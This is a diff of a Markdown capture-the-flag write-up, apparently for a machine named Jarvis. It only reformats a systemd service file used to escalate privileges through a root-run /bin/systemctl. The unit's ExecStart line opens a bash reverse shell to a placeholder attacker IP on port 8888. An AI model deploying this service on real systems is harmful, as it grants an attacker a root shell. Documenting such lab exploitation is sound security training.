@@ -131,13 +131,15 @@ Here we find **/bin/systemctl** service running with **root** permission </br>
 
 So we make a new service named shell.service </br>
 	
-`[Unit]`</br>
-`Description=hacking articles`</br> 
-`[Service]`</br>
-`Type=simple`</br>
-`ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<your ip>/8888 0>&1'`</br>
-`[Install]`</br>
-`WantedBy=multi-user.target`</br>
+```
+[Unit]
+Description=hacking articles 
+[Service]
+Type=simple
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<your ip>/8888 0>&1'
+[Install]
+WantedBy=multi-user.target
+```
 
 Now download that service file from machine to **Jarvis** machine </br>
 Now enable the service
